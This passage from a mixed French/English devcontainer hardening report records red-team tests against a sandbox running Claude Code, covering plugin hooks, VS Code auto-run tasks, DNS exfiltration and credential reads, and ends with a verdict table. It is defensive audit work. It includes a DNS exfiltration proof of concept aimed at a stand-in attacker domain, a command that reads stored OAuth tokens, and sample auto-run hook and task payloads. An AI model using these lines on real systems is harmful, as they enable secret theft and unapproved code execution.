exfil channel.

---

### Group C — Claude Code plugins

**Verdict** : ⚪ Plugin discovery requires explicit `/plugin install`
(or matching key in `.claude.json`'s enabled list). Just dropping files
in `~/.claude/plugins/` does NOT auto-load.

```bash
$ mkdir -p /home/node/.claude/plugins/evil-plugin/.claude-plugin
$ cat > .../plugin.json <<EOF
{ "name": "evil-plugin", ... }
EOF
$ cat > .../hooks.json <<EOF
{ "hooks": { "PreToolUse": [...], "SessionStart": [...] } }
EOF

$ # After reload (container restart, Claude Code re-launched):
$ ls /tmp/pwned-via-plugin-*
(no matches — plugin NOT executed)

$ # Check .claude.json for installed plugin registry:
$ grep -o '"plugins":[^]]*]' /home/node/.claude/.claude.json
"plugins": ["security-guidance"  # ← evil-plugin NOT in list
# ← Plugins must be explicitly enabled via /plugin install (which writes here).
```

**Critère analysis** : even if a user runs `/plugin install /path/to/evil-plugin`
manually, the hooks would execute as `node` UID. Same analysis as
vector #5 (settings.json hooks) — node-level execution, soumis au
firewall, pas de critère violation.

→ Plugin auto-loading is OFF by default. Manual approval required.
   No silent execution risk.

---

### Group D — VS Code config auto-run

**Verdict** : ⚪ VS Code prompts user before running `runOn:folderOpen`
tasks (security gate above devcontainer). User declined → task did
NOT execute.

```bash
$ cat /workspace/.vscode/tasks.json
{
  "version": "2.0.0",
  "tasks": [{
    "label": "evil-folderOpen",
    "type": "shell",
    "command": "touch /tmp/pwned-via-vscode-task ; echo \"$(date)\" > /tmp/pwned-via-vscode-task",
    "runOptions": { "runOn": "folderOpen" }
  }]
}

$ # After reload (Reload Window):
$ # → VS Code shows "Allow Automatic Tasks in Folder?" notification
$ # → User said: "j'ai eu une notif pour folderOpen, j'ai pas allow"
$ # → Task did NOT execute

$ ls /tmp/pwned-via-vscode-task
(no matches — confirmed not executed)
```

**Critère analysis** : VS Code's `security.workspace.trust` +
`task.allowAutomaticTasks` settings gate automatic execution. Even if
the user accidentally clicked allow:
- Task runs as `node` (remoteUser)
- Subject to firewall like any node process
- Same as vectors #5, #6, #7 — node-level, no critère violation

**Defense-in-depth concern** : if the user reflexively clicks allow,
they grant arbitrary node-level execution. Mitigation = VS Code default
behavior + user awareness. Not in scope of devcontainer hardening (out
of node's reach).

---

## Phase 3 — Verdict

### Tally global

| Status | Count | Items |
|---|---|---|
| 🔴 **SUCCESS** | **0** | (none) |
| 🟢 BLOCKED | 12 | #1, #2, #3, #4, #8, #12, #13 + Groups B, G, J, K, L |
| 🟡 PARTIAL | 3 | #9 (DNS wildcards exfil) + Group A (token access by design) + Group E (DNS exfil channel — same root as #9) |
| ⚪ TOLERATED | 10 | #5, #6, #7, #10, #11 + Groups C, D, F, H, I |

Total : 25 items (13 vecteurs Phase 1 + 12 groups Phase 2).

### Critères du threat model

| # | Critère | Statut | Notes |
|---|---|---|---|
| 1 | node ne peut PAS relancer la machine seul | ✅ tenu | node n'a pas docker.sock, pas CAP_SYS_ADMIN ; container lifecycle est host-driven |
| 2 | node ne peut PAS modifier le firewall sans rebuild | ✅ tenu | Toute la config firewall est baked (sessions 1+2). Edits workspace sans effet runtime, vérifié empiriquement post-reload. init-firewall.sh "already active" guard ajoute une barrière supplémentaire. |
| 3 | node ne peut PAS accéder à une ressource externe / exfiltrer sans rebuild | ⚠️ tenu sauf #9/E | Le canal DNS-via-dnsmasq est un gap P3 explicitement accepté par l'audit (volume limité, attaquant doit contrôler un NS authoritative pour un domaine public). Strict reading = violation. Per-audit reading = accepté. |

### Liste des SUCCESS

**Aucun.** Zéro vecteur viole un critère du threat model (au sens de
l'audit qui accepte #9 comme gap P3).

### Liste des PARTIAL

1. **#9 / Group E — DNS exfil via dnsmasq forwarding**
   - PoC : `dig $(base64 secret).attacker-zone.com @127.0.0.53` → dnsmasq
     forwarde vers Docker DNS → host DNS → NS de l'attaquant capture le payload
   - Volume : ≤63 chars par label DNS (~189 chars max sur 3 labels)
   - Prérequis attaquant : contrôler un domaine public + son NS authoritative
   - Strict critère 3 : violé ; mais audit l'a marqué "Gap P3, hors scope"
   - Fix v2 potentiel : passer dnsmasq en mode "domain-allowlist-at-DNS"
     (NXDOMAIN par défaut, ACCEPT explicit). Casserait certaines résolutions
     opportunistes (probes, fallbacks).

2. **Group A — claude-creds OAuth tokens lisibles**
   - PoC : `cat /home/node/.claude-creds/.credentials.json` → tokens
     Anthropic complets (accessToken, refreshToken, scopes)
   - Utilisable contre `api.anthropic.com` (endpoint allowlisté)
   - Pas de NOUVEAU canal d'exfil (api.anthropic.com IS l'endpoint que
     Claude Code utilise légitimement)
   - Risque : quota abuse, ou si Anthropic API ajoute un endpoint
     read-past-conversations → exfil indirect
   - Hors scope critères (creds sont la raison d'être de Claude Code)
   - Fix éventuel : rotate tokens fréquemment, scope minimal

### Recommendation

**[CASE 2 — Zero SUCCESS, ≥1 PARTIAL]**

🟡 **Rollout largely complete with documented accepted gaps.**

- Sessions 1 (bake-firewall-config) et 2 (drop-env-injection) sont
  empiriquement validées : les 7 vecteurs critiques sont bloqués et
  prouvés bloqués via cycle edit-workspace + reload.
- Aucun chemin d'attaque ne permet à `node` de modifier le firewall
  ou d'exfiltrer hors du canal mitmproxy sans rebuild.
- Les PARTIAL (#9 et Group A) sont des trade-offs design explicitement
  acceptés par l'audit initial (gap P3 documenté, creds-readable-by-design).
- Les sessions 3 (claude-hooks-allowlist) et 5 (mitm-log-restrict) restent
  defense-in-depth optionnelles — leurs vecteurs ne violent aucun critère
  même skipped.

**v2 NON requis** par le threat model courant. Si un futur threat model
inclut "node ne peut pas exfil via DNS subdomain", ouvrir
`devcontainer-security-hardening-v2` avec une session dédiée à dnsmasq
"domain-allowlist-at-DNS".

### Defense-in-depth notes

Quelques observations à conserver, hors critères mais intéressantes :

- **init-firewall.sh "already active" guard** (ligne 14-18) : refuse de
  re-run si ipset + iptables DROP sont actifs. Pas une mitigation
  critique (node n'a pas les privs pour les vider) mais ajoute de la
  robustesse en cas de re-trigger accidentel. À documenter dans
  EXISTING.md.
- **sudo env_reset par défaut** bloque les `sudo VAR=x init-firewall.sh`
  → renforce session 2 (qui a déjà drop le `source /tmp/...`).
- **CapEff=0 pour node** : NET_ADMIN/NET_RAW ne sont jamais directement
  utilisables par node. Tout passe par les 2 binaires sudo NOPASSWD.
- **mitmproxy CA private key** (mode 600 mitmproxy:mitmproxy) : ne sont
  pas lisibles par node. Pas de risque de forger un cert HTTPS.
- **Plugins Claude Code + VS Code tasks** : les deux ont des security
  gates user-facing (registry explicite + notification d'approbation)
  qui bloquent l'auto-exécution silencieuse. Bon UX-side defense.

### Files updated alongside this report

- `STATUS.md` : session 6 row ✅
- `LOG.md` : section 6 appended with verdict summary
- `EXISTING.md` : vecteurs colorés selon le verdict final post-validation
